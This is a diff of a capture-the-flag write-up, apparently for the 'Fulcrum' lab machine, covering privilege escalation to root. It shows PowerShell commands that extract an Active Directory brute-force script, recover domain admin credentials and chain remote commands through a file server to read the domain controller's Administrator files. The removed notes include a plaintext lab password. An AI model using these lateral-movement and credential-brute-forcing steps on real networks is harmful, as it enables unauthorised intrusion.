@@ -372,22 +372,52 @@ fce52521c8f872b514f037fada78daf4
 
 Time to get root!
 
--------------------------------------------------[ NOTES TO BE DELETED LATER ]-----------------------------------------
+### Root.txt
 
-$session = New-PSSession –ComputerName file.fulcrum.local -credential $creds
+After some enum we find a check-auth.ps1 file in Btables folder
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {dir ../ }
+
+    Directory: C:\Users\BTables
+Mode                LastWriteTime         Length Name                                       PSComputerName
+----                -------------         ------ ----                                       --------------
+d-r---       04-10-2017     22:12                Desktop                                    file.fulcrum.local
+d-r---       09-10-2017     20:22                Documents                                  file.fulcrum.local
+...
+-a----       12-10-2017     20:09           5502 check-auth.ps1                             file.fulcrum.local
+...
+```
+
+It creates a merged.txt file which has a csv wordlist and at the end of the file there is code for a ps1 which bruteforces the AD
+[Link to the script](https://gallery.technet.microsoft.com/scriptcenter/Bulk-check-of-Active-c1f46215)
 
 
-Invoke-Command –Session $session –ScriptBlock {whoami}
+We can tail out the script into a new ps1 file and run it against the merged.txt
 
-=> There is check-auth.ps1 which has a script
-Copy just the script into a ps1 file with tail 
-ruin it with parameteres merged.txt
-get domain admin creds 
-923a,@fulcrum_bf392748ef4e_$
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {Get-Content ../check-auth.ps1 -Tail 25 > dotalol
+.ps1}
 
-=> get root.txt
-Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke
--Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {.\dotalol.ps1 ..\merged.txt}
+...
+...
 
--------------------------------------------------[ END OF NOTES ]-----------------------------------------
 
+...
+...
+```
+
+We got domain admin creds!!! Say wuuuut !
+
+We try to use those creds from our PSSession but it gives an error
+```
+Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}
+```
+
+Maybe we dont have direct access to the dc, we might have to route the Commands through the file.fulcrum.local
+
+```
+Invoke-Command -ComputerName file.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}}
+
+Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}
+```
